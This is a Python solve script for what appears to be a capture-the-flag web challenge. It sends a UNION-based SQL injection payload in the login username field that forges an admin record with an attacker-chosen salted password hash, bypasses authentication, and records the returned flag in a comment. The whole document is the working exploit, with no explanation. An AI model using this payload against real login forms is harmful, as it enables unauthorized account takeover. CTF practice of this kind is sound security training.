import requests
import uuid
import hashlib

url="https://challenges.isictf.live:1412/"


salt = str(uuid.uuid4()).replace("-","")

password = str(uuid.uuid4()).replace("-","")+"$"+salt


pwH=hashlib.sha256(password.encode('utf-8') + salt.encode('utf-8')).hexdigest()
pwH_salt=str(pwH)+"$"+str(salt)

username='efzfzefregetrhthrhyr"UNION SELECT username, CASE WHEN username="admin"THEN"'+pwH_salt+'"ELSE password END AS password FROM users WHERE username="admin"--'


username='efzfzefregetrhthrhyr"UNION SELECT"admin","'+pwH_salt+'"--'

r=requests.post( url ,data={
    'username':username,
    'password':password
})

print(r.text)

#Welcome! here's your flag: <h3>ISICTF{Sql1_1nsp1r3d_by_hfz}</h3>
